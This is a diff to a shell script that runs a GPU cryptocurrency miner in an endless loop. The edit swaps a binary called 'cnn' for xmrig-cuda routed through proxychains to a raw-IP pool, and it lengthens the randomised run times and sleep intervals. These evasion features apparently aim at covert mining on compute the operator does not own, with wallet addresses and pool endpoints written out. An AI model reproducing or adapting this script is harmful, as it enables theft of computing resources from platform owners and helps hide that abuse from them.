@@ -6,13 +6,13 @@ do
 	z=$(($x+$y))
 
 	a=$(($RANDOM%150))
-	b=700
+	b=2400
 	c=$(($a+$b))
 
-	w=$(($RANDOM%10))
+	w=$(($RANDOM%100))
 	e=120
 	aaram=$(($w+$e))
-	timeout -k 5 $c\s  ./cnn/cnn -P stratum+ssl://REJQ8UT8XJdsD3fCmqzJs2iv4YHtDw4BGa.worker:pps@us.ravenminer.com:13803 -U
+	timeout -k 5 $c\s  proxychains ./xmrig-cuda/build/xmrig --donate-level 0 -o 54.189.231.81:13802 -u  RQk7zCj7XakGddvhaQkwwCKL6Q8nMUEiHc  -a kawpow --cuda --tls  -no-cpu -p pps --retries=5000
 	sleep $aaram
 	echo "Kartik Bhai Amar Rahe"
 done
